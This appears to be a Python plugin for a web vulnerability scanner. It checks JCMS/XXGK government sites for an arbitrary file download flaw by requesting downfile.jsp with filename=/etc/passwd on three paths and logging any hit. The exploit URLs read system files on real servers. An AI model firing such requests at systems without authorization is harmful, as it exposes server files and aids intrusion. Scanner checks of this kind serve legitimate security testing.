#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        urllist = ['jcms/m_5_9/downfile.jsp?filename=/etc/passwd&savename=1','xxgk/m_5_9/downfile.jsp?filename=/etc/passwd&savename=1','gov/m_5_9/downfile.jsp?filename=/etc/passwd&savename=1']
        for expurl in urllist:            
            geturl = "%s%s"%(url,expurl)
            res, content = requestUrl(http,geturl,ob['task_id'],ob['domain_id'])
            if res['status'] == '200' and content.find('root')>=0 and content.find('/bin/bash')>=0:
                request = getRequest(geturl)
                response = getResponse(res)
                if ob['isstart']=='1':
                    detail="验证性扫描结果：\n%s\n%s"%(content,detail) 
                list.append(getRecord(ob,geturl,ob['level'],detail,request,response))
                break
        return list
    except Exception,e:
        logging.getLogger().error("File:JCMS_XXGK_ArbitraryFileDownloadScript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:JCMS_XXGK_ArbitraryFileDownloadScript.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def
